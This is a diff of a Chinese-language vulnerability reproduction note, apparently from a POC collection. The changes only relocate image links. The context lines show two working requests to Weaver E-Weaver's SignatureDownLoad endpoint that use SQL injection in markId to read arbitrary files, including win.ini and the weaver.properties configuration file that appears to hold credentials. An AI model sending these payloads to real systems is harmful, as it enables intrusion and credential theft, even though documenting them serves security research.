@@ -16,7 +16,7 @@ app="泛微-E-Weaver"
 
 ## 漏洞复现
 
-![image-20220706133659005](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202207061336151.png)
+![image-20220706133659005](./images/202207061336151.png)
 
 验证POC
 
@@ -24,10 +24,10 @@ app="泛微-E-Weaver"
 /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27
 ```
 
-![image-20220706133707852](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202207061337908.png)
+![image-20220706133707852](./images/202207061337908.png)
 
 ```
 /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
 ```
 
-![image-20220706133717202](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202207061337932.png)
+![image-20220706133717202](./images/202207061337932.png)
